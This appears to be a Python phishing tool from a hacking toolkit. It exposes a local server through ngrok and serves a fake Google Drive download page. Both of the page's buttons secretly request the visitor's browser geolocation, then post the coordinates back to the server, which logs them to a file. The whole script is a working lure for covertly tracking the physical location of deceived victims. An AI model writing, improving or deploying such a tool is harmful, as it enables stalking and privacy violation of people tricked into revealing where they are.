import subprocess
import http.server
import socketserver
import json

# Prompt user for ngrok executable path
NGROK_PATH = input("Enter the path to ngrok executable: ").strip()
# Local server port
SERVER_PORT = 8000
# File path for logs
# File path for logs
LOGS_FILE = r'd:\PROJECTS\0042\logs.txt'
LOGS_FILE = input("Enter the path to Logs File ").strip()

# Start ngrok to expose the local server
def start_ngrok():
    subprocess.Popen([NGROK_PATH, 'http', str(SERVER_PORT)])

# Simple HTTP server
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
<html>
<head>
    <title>Wait!</title>
    <style>
        body {
            text-align: center;
            background-color: #333;
            color: #eee;
        }
        img {
            display: block;
            margin: 0 auto;
        }
        .button {
            background-color: #555;
            border: none;
            color: white;
            padding: 15px 32px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border-radius: 8px;
            display: block;
            margin: 20px auto;
        }
    </style>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/");
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            xhr.send(JSON.stringify({latitude: position.coords.latitude, longitude: position.coords.longitude}));
            alert("Location sent to server!");
        }
    </script>
</head>
<body>
    <h1>Before proceeding...</h1>
    <img src="/gdrive.png" alt="Google Drive Image">
    <p>Login to download or Download without logging in?:</p>
    <button class="button" onclick="getLocation()">Log in.</button>
    <button class="button" onclick="getLocation()">Continue without logging in.</button>

</body>
</html>
            ''')
            return
            
        elif self.path == '/gdrive.png':
            try:
                with open(r'd:\MY TOOLS\ES23-HACKING-MENU\gps\gdrive.png', 'rb') as file:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/png')
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_error(404, 'File Not Found')
            return

        # Log when ngrok link is accessed
        print(f'ngrok link accessed from: {self.client_address}')

        super().do_GET()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        print(f'GPS coordinates received: Latitude: {data["latitude"]}, Longitude: {data["longitude"]}')

        # Save coordinates to logs file
        try:
            with open(LOGS_FILE, 'a') as logs:
                logs.write(f'Latitude: {data["latitude"]}, Longitude: {data["longitude"]}\n')
            print("Coordinates saved to logs.txt successfully.")
        except Exception as e:
            print("Error occurred while saving coordinates to logs.txt:", e)
            import traceback
            traceback.print_exc()

def start_server():
    handler_object = MyHttpRequestHandler
    my_server = socketserver.TCPServer(('localhost', SERVER_PORT), handler_object)
    my_server.serve_forever()

if __name__ == "__main__":
    start_ngrok()
    start_server()
